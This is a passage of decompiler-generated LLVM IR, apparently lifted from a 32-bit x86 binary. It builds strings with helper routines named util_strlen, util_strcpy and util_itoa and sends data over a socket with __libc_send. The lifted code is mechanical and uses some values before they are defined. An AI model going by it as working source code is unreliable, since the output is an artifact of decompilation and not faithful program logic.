  %v2_80492ac = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_80492ac, i32* %eax.global-to-local, align 4
  %v0_80492b1 = load i32, i32* @esp, align 4
  %v1_80492b1 = inttoptr i32 %v0_80492b1 to i32*
  %v2_80492b1 = load i32, i32* %v1_80492b1, align 4
  store i32 %v2_80492b1, i32* %edx.global-to-local, align 4
  %v3_80492b1 = add i32 %v0_80492b1, 4
  %v1_80492b2 = inttoptr i32 %v3_80492b1 to i32*
  %v2_80492b2 = load i32, i32* %v1_80492b2, align 4
  store i32 %v2_80492b2, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80558fc.14 to i32), i32* %v1_80492b2, align 4
  %v1_80492b8 = add i32 %v0_80492b1, 10388
  store i32 %v1_80492b8, i32* %edx.global-to-local, align 4
  %v2_80492bf = add i32 %v1_80492b8, %v2_80492ac
  store i32 %v2_80492bf, i32* @eax, align 4
  store i32 %v2_80492bf, i32* %v1_80492b1, align 4
  %v3_80492c3 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_80492c3, i32* %eax.global-to-local, align 4
  %v0_80492c8 = load i32, i32* @esp, align 4
  %v1_80492c8 = inttoptr i32 %v0_80492c8 to i32*
  %v2_80492c8 = load i32, i32* %v1_80492c8, align 4
  store i32 %v2_80492c8, i32* %eax.global-to-local, align 4
  %v1_80492c9 = add i32 %v0_80492c8, 10388
  store i32 %v1_80492c9, i32* %ecx.global-to-local, align 4
  store i32 %v1_80492c9, i32* %v1_80492c8, align 4
  %v2_80492d1 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_80492d1, i32* %eax.global-to-local, align 4
  store i32 %v2_80492d1, i32* @ebx, align 4
  %v0_80492d8 = load i32, i32* @esp, align 4
  %v1_80492d8 = inttoptr i32 %v0_80492d8 to i32*
  %v2_80492d8 = load i32, i32* %v1_80492d8, align 4
  store i32 %v2_80492d8, i32* %eax.global-to-local, align 4
  %v1_80492d9 = add i32 %v0_80492d8, 88
  %v2_80492d9 = inttoptr i32 %v1_80492d9 to i32*
  %v3_80492d9 = load i32, i32* %v2_80492d9, align 4
  store i32 %v3_80492d9, i32* %eax.global-to-local, align 4
  store i32 %v3_80492d9, i32* %v1_80492d8, align 4
  %v2_80492de = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_80492de, i32* %eax.global-to-local, align 4
  %v0_80492e3 = load i32, i32* @esp, align 4
  %v1_80492e6 = add i32 %v0_80492e3, 10388
  %v1_80492ed = load i32, i32* @ebx, align 4
  %v2_80492ed = add i32 %v1_80492e6, %v1_80492ed
  %v12_80492ed = icmp eq i32 %v2_80492ed, 0
  store i1 %v12_80492ed, i1* %zf.global-to-local, align 1
  store i32 %v2_80492ed, i32* %edx.global-to-local, align 4
  %v2_80492ef = add i32 %v0_80492e3, 8
  %v3_80492ef = inttoptr i32 %v2_80492ef to i32*
  store i32 %v2_80492ed, i32* %v3_80492ef, align 4
  %v1_80492f0 = add i32 %v0_80492e3, 4
  %v2_80492f0 = inttoptr i32 %v1_80492f0 to i32*
  store i32 10, i32* %v2_80492f0, align 4
  %v3_80492f2 = inttoptr i32 %v0_80492e3 to i32*
  store i32 %v2_80492de, i32* %v3_80492f2, align 4
  %v4_80492f3 = call i32 @util_itoa(i64 %v3_80492f3, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80492f3, i32* %eax.global-to-local, align 4
  %v0_80492f8 = load i32, i32* @esp, align 4
  %v1_80492f8 = inttoptr i32 %v0_80492f8 to i32*
  %v2_80492f8 = load i32, i32* %v1_80492f8, align 4
  store i32 %v2_80492f8, i32* @ebx, align 4
  %v1_80492f9 = add i32 %v0_80492f8, 10388
  store i32 %v1_80492f9, i32* %eax.global-to-local, align 4
  store i32 %v1_80492f9, i32* %v1_80492f8, align 4
  %v2_8049301 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8049301, i32* %eax.global-to-local, align 4
  %v0_8049306 = load i32, i32* @esp, align 4
  %v1_8049306 = inttoptr i32 %v0_8049306 to i32*
  %v2_8049306 = load i32, i32* %v1_8049306, align 4
  store i32 %v2_8049306, i32* %edx.global-to-local, align 4
  %v3_8049306 = add i32 %v0_8049306, 4
  %v1_8049307 = inttoptr i32 %v3_8049306 to i32*
  %v2_8049307 = load i32, i32* %v1_8049307, align 4
  store i32 %v2_8049307, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v1_8049307, align 4
  %v1_804930d = add i32 %v0_8049306, 10388
  store i32 %v1_804930d, i32* %edx.global-to-local, align 4
  %v2_8049314 = add i32 %v1_804930d, %v2_8049301
  store i32 %v2_8049314, i32* @eax, align 4
  store i32 %v2_8049314, i32* %v1_8049306, align 4
  %v3_8049318 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_8049318, i32* %eax.global-to-local, align 4
  %v0_804931d = load i32, i32* @esp, align 4
  %v1_804931d = add i32 %v0_804931d, 16
  %v6_804931d = icmp eq i32 %v1_804931d, 0
  store i1 %v6_804931d, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049320

dec_label_pc_8049320:                             ; preds = %dec_label_pc_8048f42, %dec_label_pc_804920c
  %v0_804932e = phi i32 [ %v1_80491fd, %dec_label_pc_8048f42 ], [ %v1_804931d, %dec_label_pc_804920c ]
  %v0_8049320 = load i32, i32* @esi, align 4
  %v1_8049320 = add i32 %v0_8049320, 1452
  %v2_8049320 = inttoptr i32 %v1_8049320 to i32*
  %v3_8049320 = load i32, i32* %v2_8049320, align 4
  store i32 %v3_8049320, i32* @ebx, align 4
  %v1_8049326 = icmp eq i32 %v3_8049320, 0
  store i1 %v1_8049326, i1* %zf.global-to-local, align 1
  %tmp122 = icmp slt i32 %v3_8049320, 1
  br i1 %tmp122, label %dec_label_pc_8049406, label %dec_label_pc_804932e

dec_label_pc_804932e:                             ; preds = %dec_label_pc_8049320
  %v9_804932e = icmp eq i32 %v0_804932e, 12
  store i1 %v9_804932e, i1* %zf.global-to-local, align 1
  %v1_8049331 = add i32 %v0_804932e, 10372
  store i32 %v1_8049331, i32* %ecx.global-to-local, align 4
  %v2_8049338 = add i32 %v0_804932e, -16
  %v3_8049338 = inttoptr i32 %v2_8049338 to i32*
  store i32 %v1_8049331, i32* %v3_8049338, align 4
  %v2_8049339 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8049339, i32* %eax.global-to-local, align 4
  %v0_804933e = load i32, i32* @esp, align 4
  %v1_804933e = inttoptr i32 %v0_804933e to i32*
  %v2_804933e = load i32, i32* %v1_804933e, align 4
  store i32 %v2_804933e, i32* %edx.global-to-local, align 4
  %v3_804933e = add i32 %v0_804933e, 4
  %v1_804933f = inttoptr i32 %v3_804933e to i32*
  %v2_804933f = load i32, i32* %v1_804933f, align 4
  store i32 %v2_804933f, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8055858.18 to i32), i32* %v1_804933f, align 4
  %v1_8049345 = add i32 %v0_804933e, 10388
  store i32 %v1_8049345, i32* %edx.global-to-local, align 4
  %v2_804934c = add i32 %v1_8049345, %v2_8049339
  store i32 %v2_804934c, i32* @eax, align 4
  store i32 %v2_804934c, i32* %v1_804933e, align 4
  %v3_8049350 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_8049350, i32* %eax.global-to-local, align 4
  %v0_8049355 = load i32, i32* @esp, align 4
  %v1_8049355 = add i32 %v0_8049355, 20916
  %v2_8049355 = inttoptr i32 %v1_8049355 to i32*
  store i32 0, i32* %v2_8049355, align 4
  %v0_8049360 = load i32, i32* @esp, align 4
  %v1_8049360 = add i32 %v0_8049360, 16
  %v0_8049363 = load i32, i32* @esi, align 4
  %v1_8049363 = add i32 %v0_8049363, 1452
  %v2_8049363 = inttoptr i32 %v1_8049363 to i32*
  %v3_8049363 = load i32, i32* %v2_8049363, align 4
  store i32 %v3_8049363, i32* %ebx.global-to-local, align 4
  %v1_8049369 = icmp eq i32 %v3_8049363, 0
  store i1 %v1_8049369, i1* %zf.global-to-local, align 1
  %tmp123 = icmp slt i32 %v3_8049363, 1
  br i1 %tmp123, label %dec_label_pc_80493dc, label %dec_label_pc_804936d

dec_label_pc_804936d:                             ; preds = %dec_label_pc_804932e
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049370

dec_label_pc_8049370:                             ; preds = %dec_label_pc_8049370, %dec_label_pc_804936d
  %v0_8049373 = phi i32 [ %v1_80493d1, %dec_label_pc_8049370 ], [ %v1_8049360, %dec_label_pc_804936d ]
  %v0_8049370 = phi i32 [ %v4_80493d4, %dec_label_pc_8049370 ], [ 0, %dec_label_pc_804936d ]
  %v2_8049370 = mul i32 %v0_8049370, 128
  store i32 %v2_8049370, i32* @ebx, align 4
  %v9_8049373 = icmp eq i32 %v0_8049373, 12
  store i1 %v9_8049373, i1* %zf.global-to-local, align 1
  %v1_8049376 = add i32 %v0_8049373, 10372
  store i32 %v1_8049376, i32* %ecx.global-to-local, align 4
  %v2_804937d = add i32 %v0_8049373, -16
  %v3_804937d = inttoptr i32 %v2_804937d to i32*
  store i32 %v1_8049376, i32* %v3_804937d, align 4
  %v2_804937e = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_804937e, i32* %eax.global-to-local, align 4
  %v0_8049383 = load i32, i32* @esp, align 4
  %v1_8049383 = inttoptr i32 %v0_8049383 to i32*
  %v3_8049383 = add i32 %v0_8049383, 4
  %v0_8049384 = load i32, i32* @edi, align 4
  %v1_8049384 = load i32, i32* @ebx, align 4
  %v2_8049384 = add i32 %v0_8049384, 1472
  %v3_8049384 = add i32 %v2_8049384, %v1_8049384
  store i32 %v3_8049384, i32* %edx.global-to-local, align 4
  %v1_804938b = inttoptr i32 %v3_8049383 to i32*
  %v2_804938b = load i32, i32* %v1_804938b, align 4
  store i32 %v2_804938b, i32* %ecx.global-to-local, align 4
  store i32 %v3_8049384, i32* %v1_804938b, align 4
  %v1_804938d = add i32 %v0_8049383, 10388
  store i32 %v1_804938d, i32* %edx.global-to-local, align 4
  %v2_8049394 = add i32 %v1_804938d, %v2_804937e
  store i32 %v2_8049394, i32* @eax, align 4
  store i32 %v2_8049394, i32* %v1_8049383, align 4
  %v3_8049398 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_8049398, i32* %eax.global-to-local, align 4
  %v0_804939d = load i32, i32* @esp, align 4
  %v1_804939d = inttoptr i32 %v0_804939d to i32*
  %v2_804939d = load i32, i32* %v1_804939d, align 4
  store i32 %v2_804939d, i32* %eax.global-to-local, align 4
  %v1_804939e = add i32 %v0_804939d, 10388
  store i32 %v1_804939e, i32* %ecx.global-to-local, align 4
  store i32 %v1_804939e, i32* %v1_804939d, align 4
  %v2_80493a6 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_80493a6, i32* %eax.global-to-local, align 4
  %v0_80493ab = load i32, i32* @esp, align 4
  %v1_80493ab = inttoptr i32 %v0_80493ab to i32*
  %v2_80493ab = load i32, i32* %v1_80493ab, align 4
  store i32 %v2_80493ab, i32* %ecx.global-to-local, align 4
  %v3_80493ab = add i32 %v0_80493ab, 4
  %v1_80493ac = inttoptr i32 %v3_80493ab to i32*
  %v2_80493ac = load i32, i32* %v1_80493ac, align 4
  store i32 %v2_80493ac, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8055861.19 to i32), i32* %v1_80493ac, align 4
  %v1_80493b2 = add i32 %v0_80493ab, 10388
  store i32 %v1_80493b2, i32* %edx.global-to-local, align 4
  %v2_80493b9 = add i32 %v1_80493b2, %v2_80493a6
  store i32 %v2_80493b9, i32* @eax, align 4
  store i32 %v2_80493b9, i32* %v1_80493ab, align 4
  %v3_80493bd = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_80493bd, i32* %eax.global-to-local, align 4
  %v0_80493c2 = load i32, i32* @esp, align 4
  %v1_80493c2 = add i32 %v0_80493c2, 20916
  %v2_80493c2 = inttoptr i32 %v1_80493c2 to i32*
  %v3_80493c2 = load i32, i32* %v2_80493c2, align 4
  %v1_80493c9 = add i32 %v3_80493c2, 1
  store i32 %v1_80493c9, i32* %ebx.global-to-local, align 4
  store i32 %v1_80493c9, i32* %v2_80493c2, align 4
  %v0_80493d1 = load i32, i32* @esp, align 4
  %v1_80493d1 = add i32 %v0_80493d1, 16
  %v0_80493d4 = load i32, i32* @esi, align 4
  %v1_80493d4 = add i32 %v0_80493d4, 1452
  %v2_80493d4 = inttoptr i32 %v1_80493d4 to i32*
  %v3_80493d4 = load i32, i32* %v2_80493d4, align 4
  %v4_80493d4 = load i32, i32* %ebx.global-to-local, align 4
  %v5_80493d4 = sub i32 %v3_80493d4, %v4_80493d4
  %v11_80493d4 = xor i32 %v4_80493d4, %v3_80493d4
  %v12_80493d4 = xor i32 %v5_80493d4, %v3_80493d4
  %v13_80493d4 = and i32 %v12_80493d4, %v11_80493d4
  %v14_80493d4 = icmp slt i32 %v13_80493d4, 0
  %v15_80493d4 = icmp eq i32 %v5_80493d4, 0
  store i1 %v15_80493d4, i1* %zf.global-to-local, align 1
  %v16_80493d4 = icmp slt i32 %v5_80493d4, 0
  %v3_80493da = icmp eq i1 %v16_80493d4, %v14_80493d4
  %v4_80493da = icmp eq i1 %v15_80493d4, false
  %v5_80493da = and i1 %v4_80493da, %v3_80493da
  br i1 %v5_80493da, label %dec_label_pc_8049370, label %dec_label_pc_80493dc

dec_label_pc_80493dc:                             ; preds = %dec_label_pc_8049370, %dec_label_pc_804932e
  %v0_80493dc = phi i32 [ %v1_8049360, %dec_label_pc_804932e ], [ %v1_80493d1, %dec_label_pc_8049370 ]
  %v9_80493dc = icmp eq i32 %v0_80493dc, 12
  store i1 %v9_80493dc, i1* %zf.global-to-local, align 1
  %v1_80493df = add i32 %v0_80493dc, 10372
  store i32 %v1_80493df, i32* %ecx.global-to-local, align 4
  %v2_80493e6 = add i32 %v0_80493dc, -16
  %v3_80493e6 = inttoptr i32 %v2_80493e6 to i32*
  store i32 %v1_80493df, i32* %v3_80493e6, align 4
  %v2_80493e7 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_80493e7, i32* %eax.global-to-local, align 4
  %v0_80493ec = load i32, i32* @esp, align 4
  %v1_80493ec = inttoptr i32 %v0_80493ec to i32*
  %v2_80493ec = load i32, i32* %v1_80493ec, align 4
  store i32 %v2_80493ec, i32* @ebx, align 4
  %v3_80493ec = add i32 %v0_80493ec, 4
  %v1_80493ed = inttoptr i32 %v3_80493ec to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v1_80493ed, align 4
  %v1_80493f3 = add i32 %v0_80493ec, 10388
  store i32 %v1_80493f3, i32* %edx.global-to-local, align 4
  %v2_80493fa = add i32 %v1_80493f3, %v2_80493e7
  store i32 %v2_80493fa, i32* @eax, align 4
  store i32 %v2_80493fa, i32* %v1_80493ec, align 4
  %v3_80493fe = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_80493fe, i32* %eax.global-to-local, align 4
  %v0_8049403 = load i32, i32* @esp, align 4
  %v1_8049403 = add i32 %v0_8049403, 16
  %v6_8049403 = icmp eq i32 %v1_8049403, 0
  store i1 %v6_8049403, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049406

dec_label_pc_8049406:                             ; preds = %dec_label_pc_8049320, %dec_label_pc_80493dc
  %v0_8049406 = phi i32 [ %v0_804932e, %dec_label_pc_8049320 ], [ %v1_8049403, %dec_label_pc_80493dc ]
  %v9_8049406 = icmp eq i32 %v0_8049406, 12
  store i1 %v9_8049406, i1* %zf.global-to-local, align 1
  %v1_8049409 = add i32 %v0_8049406, 10372
  store i32 %v1_8049409, i32* %ecx.global-to-local, align 4
  %v2_8049410 = add i32 %v0_8049406, -16
  %v3_8049410 = inttoptr i32 %v2_8049410 to i32*
  store i32 %v1_8049409, i32* %v3_8049410, align 4
  %v2_8049411 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8049411, i32* %eax.global-to-local, align 4
  %v0_8049416 = load i32, i32* @esp, align 4
  %v1_8049416 = inttoptr i32 %v0_8049416 to i32*
  %v2_8049416 = load i32, i32* %v1_8049416, align 4
  store i32 %v2_8049416, i32* %edx.global-to-local, align 4
  %v3_8049416 = add i32 %v0_8049416, 4
  %v1_8049417 = inttoptr i32 %v3_8049416 to i32*
  %v2_8049417 = load i32, i32* %v1_8049417, align 4
  store i32 %v2_8049417, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v1_8049417, align 4
  %v1_804941d = add i32 %v0_8049416, 10388
  store i32 %v1_804941d, i32* %edx.global-to-local, align 4
  %v2_8049424 = add i32 %v1_804941d, %v2_8049411
  store i32 %v2_8049424, i32* @eax, align 4
  store i32 %v2_8049424, i32* %v1_8049416, align 4
  %v3_8049428 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_8049428, i32* %eax.global-to-local, align 4
  %v0_804942d = load i32, i32* @esp, align 4
  %v1_804942d = add i32 %v0_804942d, 16
  %v1_8049430 = add i32 %v0_804942d, 88
  %v2_8049430 = inttoptr i32 %v1_8049430 to i32*
  %v3_8049430 = load i32, i32* %v2_8049430, align 4
  store i32 %v3_8049430, i32* %ebx.global-to-local, align 4
  %v1_8049434 = icmp eq i32 %v3_8049430, 0
  store i1 %v1_8049434, i1* %zf.global-to-local, align 1
  br i1 %v1_8049434, label %dec_label_pc_8049462, label %dec_label_pc_8049438

dec_label_pc_8049438:                             ; preds = %dec_label_pc_8049406
  %v9_8049438 = icmp eq i32 %v0_804942d, -4
  store i1 %v9_8049438, i1* %zf.global-to-local, align 1
  %v1_804943b = add i32 %v0_804942d, 10388
  store i32 %v1_804943b, i32* %ecx.global-to-local, align 4
  %v3_8049442 = inttoptr i32 %v0_804942d to i32*
  store i32 %v1_804943b, i32* %v3_8049442, align 4
  %v2_8049443 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8049443, i32* %eax.global-to-local, align 4
  %v0_8049448 = load i32, i32* @esp, align 4
  %v1_8049448 = inttoptr i32 %v0_8049448 to i32*
  %v2_8049448 = load i32, i32* %v1_8049448, align 4
  store i32 %v2_8049448, i32* %edx.global-to-local, align 4
  %v3_8049448 = add i32 %v0_8049448, 4
  %v1_8049449 = inttoptr i32 %v3_8049448 to i32*
  %v2_8049449 = load i32, i32* %v1_8049449, align 4
  store i32 %v2_8049449, i32* %ecx.global-to-local, align 4
  %v1_804944a = add i32 %v0_8049448, 88
  %v2_804944a = inttoptr i32 %v1_804944a to i32*
  %v3_804944a = load i32, i32* %v2_804944a, align 4
  store i32 %v3_804944a, i32* @ebx, align 4
  store i32 %v3_804944a, i32* %v1_8049449, align 4
  %v1_804944f = add i32 %v0_8049448, 10388
  store i32 %v1_804944f, i32* %edx.global-to-local, align 4
  %v2_8049456 = add i32 %v1_804944f, %v2_8049443
  store i32 %v2_8049456, i32* @eax, align 4
  store i32 %v2_8049456, i32* %v1_8049448, align 4
  %v3_804945a = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_804945a, i32* %eax.global-to-local, align 4
  %v0_804945f = load i32, i32* @esp, align 4
  %v1_804945f = add i32 %v0_804945f, 16
  %v6_804945f = icmp eq i32 %v1_804945f, 0
  store i1 %v6_804945f, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049462

dec_label_pc_8049462:                             ; preds = %dec_label_pc_8049406, %dec_label_pc_8049438
  %v1_8049468 = phi i32 [ %v1_804942d, %dec_label_pc_8049406 ], [ %v1_804945f, %dec_label_pc_8049438 ]
  %v0_8049462 = load i32, i32* @edi, align 4
  %v1_8049462 = add i32 %v0_8049462, 1440
  store i32 %v1_8049462, i32* @ebx, align 4
  %v0_8049468 = load i32, i32* @ecx, align 4
  %v2_8049468 = add i32 %v1_8049468, -4
  %v3_8049468 = inttoptr i32 %v2_8049468 to i32*
  store i32 %v0_8049468, i32* %v3_8049468, align 4
  %v0_8049469 = load i32, i32* @ecx, align 4
  %v2_8049469 = add i32 %v1_8049468, -8
  %v3_8049469 = inttoptr i32 %v2_8049469 to i32*
  store i32 %v0_8049469, i32* %v3_8049469, align 4
  %v0_804946a = load i32, i32* @ebx, align 4
  %v2_804946a = add i32 %v1_8049468, -12
  %v3_804946a = inttoptr i32 %v2_804946a to i32*
  store i32 %v0_804946a, i32* %v3_804946a, align 4
  %v1_804946b = add i32 %v1_8049468, 52
  %v2_804946b = inttoptr i32 %v1_804946b to i32*
  %v3_804946b = load i32, i32* %v2_804946b, align 4
  store i32 %v3_804946b, i32* %edx.global-to-local, align 4
  %v2_804946f = add i32 %v1_8049468, -16
  %v3_804946f = inttoptr i32 %v2_804946f to i32*
  store i32 %v3_804946b, i32* %v3_804946f, align 4
  %v0_8049470 = call i32 @util_strcmp()
  store i32 %v0_8049470, i32* %eax.global-to-local, align 4
  %v0_8049475 = load i32, i32* @esp, align 4
  %v1_8049475 = add i32 %v0_8049475, 16
  %v3_8049478 = trunc i32 %v0_8049470 to i8
  %v4_8049478 = icmp eq i8 %v3_8049478, 0
  store i1 %v4_8049478, i1* %zf.global-to-local, align 1
  br i1 %v4_8049478, label %dec_label_pc_8049f15, label %dec_label_pc_8049480

dec_label_pc_8049480:                             ; preds = %dec_label_pc_8049462, %dec_label_pc_8049f15
  %v0_8049480 = phi i32 [ %v1_8049475, %dec_label_pc_8049462 ], [ %v1_8049f22, %dec_label_pc_8049f15 ]
  %v9_8049480 = icmp eq i32 %v0_8049480, 12
  store i1 %v9_8049480, i1* %zf.global-to-local, align 1
  %v1_8049483 = add i32 %v0_8049480, 10372
  store i32 %v1_8049483, i32* %ecx.global-to-local, align 4
  %v2_804948a = add i32 %v0_8049480, -16
  %v3_804948a = inttoptr i32 %v2_804948a to i32*
  store i32 %v1_8049483, i32* %v3_804948a, align 4
  %v2_804948b = call i32 @util_strlen(i8* %v1_8048f9a)
  %v0_8049490 = load i32, i32* @esp, align 4
  %v1_8049490 = add i32 %v0_8049490, -4
  %v2_8049490 = inttoptr i32 %v1_8049490 to i32*
  store i32 16384, i32* %v2_8049490, align 4
  %v2_8049495 = add i32 %v0_8049490, -8
  %v3_8049495 = inttoptr i32 %v2_8049495 to i32*
  store i32 %v2_804948b, i32* %v3_8049495, align 4
  %v1_8049496 = add i32 %v0_8049490, 10388
  store i32 %v1_8049496, i32* %eax.global-to-local, align 4
  %v2_804949d = add i32 %v0_8049490, -12
  %v3_804949d = inttoptr i32 %v2_804949d to i32*
  store i32 %v1_8049496, i32* %v3_804949d, align 4
  %v0_804949e = load i32, i32* @esi, align 4
  %v1_804949e = add i32 %v0_804949e, -16
  %v2_804949e = inttoptr i32 %v1_804949e to i32*
  %v3_804949e = load i32, i32* %v2_804949e, align 4
  store i32 %v3_804949e, i32* %eax.global-to-local, align 4
  %v2_80494a1 = add i32 %v0_8049490, -16
  %v3_80494a1 = inttoptr i32 %v2_80494a1 to i32*
  store i32 %v3_804949e, i32* %v3_80494a1, align 4
  %v4_80494a2 = call i32 @__libc_send(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80494a2, i32* %eax.global-to-local, align 4
  %v0_80494a7 = load i32, i32* @esp, align 4
  %v1_80494a7 = add i32 %v0_80494a7, 80
  %v2_80494a7 = inttoptr i32 %v1_80494a7 to i32*
  %v3_80494a7 = load i32, i32* %v2_80494a7, align 4
  store i32 %v3_80494a7, i32* %edx.global-to-local, align 4
  %v0_80494ab = load i32, i32* @esi, align 4
  %v1_80494ab = add i32 %v0_80494ab, -16
  %v2_80494ab = inttoptr i32 %v1_80494ab to i32*
  %v3_80494ab = load i32, i32* %v2_80494ab, align 4
  store i32 %v3_80494ab, i32* %eax.global-to-local, align 4
  %v2_80494ae = add i32 %v0_80494ab, -4
  %v3_80494ae = inttoptr i32 %v2_80494ae to i32*
  store i32 %v3_80494a7, i32* %v3_80494ae, align 4
  %v0_80494b1 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_80494b1, i32* %edx.global-to-local, align 4
  %v0_80494b3 = load i32, i32* @esi, align 4
  %v1_80494b3 = add i32 %v0_80494b3, -12
  %v2_80494b3 = inttoptr i32 %v1_80494b3 to i8*
  store i8 6, i8* %v2_80494b3, align 1
  %v0_80494b7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80494b7 = urem i32 %v0_80494b7, 32
  store i32 %v1_80494b7, i32* %eax.global-to-local, align 4
  %v0_80494ba = load i32, i32* %edx.global-to-local, align 4
  %v2_80494ba = udiv i32 %v0_80494ba, 32
  store i32 %v2_80494ba, i32* %edx.global-to-local, align 4
  %v0_80494bd = load i32, i32* @esp, align 4
  %v2_80494bd = mul nuw nsw i32 %v2_80494ba, 4
  %v3_80494bd = add nuw nsw i32 %v2_80494bd, 20772
  %v4_80494bd = add i32 %v3_80494bd, %v0_80494bd
  %v5_80494bd = inttoptr i32 %v4_80494bd to i32*
  %v6_80494bd = load i32, i32* %v5_80494bd, align 4
  %v9_80494bd = shl i32 1, %v1_80494b7
  %v12_80494bd = or i32 %v6_80494bd, %v9_80494bd
  %v16_80494bd = add i32 %v0_80494bd, 20772
  %v17_80494bd = add i32 %v16_80494bd, %v2_80494bd
  %v18_80494bd = inttoptr i32 %v17_80494bd to i32*
  store i32 %v12_80494bd, i32* %v18_80494bd, align 4
  %v0_80494c5 = load i32, i32* @esp, align 4
  %v1_80494c5 = add i32 %v0_80494c5, 32
  %v0_80494c8 = load i32, i32* @esi, align 4
  %v1_80494c8 = add i32 %v0_80494c8, -16
  %v2_80494c8 = inttoptr i32 %v1_80494c8 to i32*
  %v3_80494c8 = load i32, i32* %v2_80494c8, align 4
  store i32 %v3_80494c8, i32* %eax.global-to-local, align 4
  %v2_80494cb = add i32 %v0_80494c5, 124
  %v3_80494cb = inttoptr i32 %v2_80494cb to i32*
  %v4_80494cb = load i32, i32* %v3_80494cb, align 4
  %v5_80494cb = sub i32 %v3_80494c8, %v4_80494cb
  %v11_80494cb = xor i32 %v4_80494cb, %v3_80494c8
  %v12_80494cb = xor i32 %v5_80494cb, %v3_80494c8
  %v13_80494cb = and i32 %v12_80494cb, %v11_80494cb
  %v14_80494cb = icmp slt i32 %v13_80494cb, 0
  %v15_80494cb = icmp eq i32 %v5_80494cb, 0
  store i1 %v15_80494cb, i1* %zf.global-to-local, align 1
  %v16_80494cb = icmp slt i32 %v5_80494cb, 0
  %v3_80494cf = icmp ne i1 %v16_80494cb, %v14_80494cb
  %v4_80494cf = or i1 %v15_80494cb, %v3_80494cf
  br i1 %v4_80494cf, label %dec_label_pc_8048ca2, label %dec_label_pc_8048dc4

dec_label_pc_80494da:                             ; preds = %dec_label_pc_8048f30
  store i8 0, i8* %v2_8048cb3, align 1
  br label %dec_label_pc_8048cc5

dec_label_pc_80494e3:                             ; preds = %dec_label_pc_8048c60
  %v0_80494e3 = load i32, i32* @esp, align 4
  %v1_80494e3 = add i32 %v0_80494e3, 48
  %v2_80494e3 = inttoptr i32 %v1_80494e3 to i32*
  %v3_80494e3 = load i32, i32* %v2_80494e3, align 4
  store i32 %v3_80494e3, i32* %eax.global-to-local, align 4
  %v1_80494e7 = add i32 %v0_8048cb3, -8
  %v2_80494e7 = inttoptr i32 %v1_80494e7 to i32*
  %v3_80494e7 = load i32, i32* %v2_80494e7, align 4
  store i32 %v3_80494e7, i32* @ebx, align 4
  %v2_80494ea = sub i32 %v3_80494e3, %v3_80494e7
  store i32 %v2_80494ea, i32* %eax.global-to-local, align 4
  %v9_80494ec = icmp eq i32 %v2_80494ea, 30
  store i1 %v9_80494ec, i1* %zf.global-to-local, align 1
  %tmp172 = icmp ult i32 %v2_80494ea, 31
  br i1 %tmp172, label %dec_label_pc_80494f5, label %dec_label_pc_8048c88

dec_label_pc_80494f5:                             ; preds = %dec_label_pc_80494e3
  %v2_80494f5 = inttoptr i32 %v1_8048cb6 to i32*
  %v3_80494f5 = load i32, i32* %v2_80494f5, align 4
  %v1_80494fa = urem i32 %v3_80494f5, 32
  store i32 %v1_80494fa, i32* %eax.global-to-local, align 4
  %v2_80494fd = udiv i32 %v3_80494f5, 32
  store i32 %v2_80494fd, i32* %edx.global-to-local, align 4
  %v2_8049500 = mul nuw nsw i32 %v2_80494fd, 4
  %v3_8049500 = add i32 %v0_80494e3, 20612
  %v4_8049500 = add i32 %v3_8049500, %v2_8049500
  %v5_8049500 = inttoptr i32 %v4_8049500 to i32*
  %v6_8049500 = load i32, i32* %v5_8049500, align 4
  %v9_8049500 = shl i32 1, %v1_80494fa
  %v12_8049500 = or i32 %v6_8049500, %v9_8049500
  store i32 %v12_8049500, i32* %v5_8049500, align 4
  %v0_8049508 = load i32, i32* @esi, align 4
  %v1_8049508 = add i32 %v0_8049508, -16
  %v2_8049508 = inttoptr i32 %v1_8049508 to i32*
  %v3_8049508 = load i32, i32* %v2_8049508, align 4
  store i32 %v3_8049508, i32* %eax.global-to-local, align 4
  %v1_804950b = load i32, i32* @esp, align 4
  %v2_804950b = add i32 %v1_804950b, 92
  %v3_804950b = inttoptr i32 %v2_804950b to i32*
  %v4_804950b = load i32, i32* %v3_804950b, align 4
  %v5_804950b = sub i32 %v3_8049508, %v4_804950b
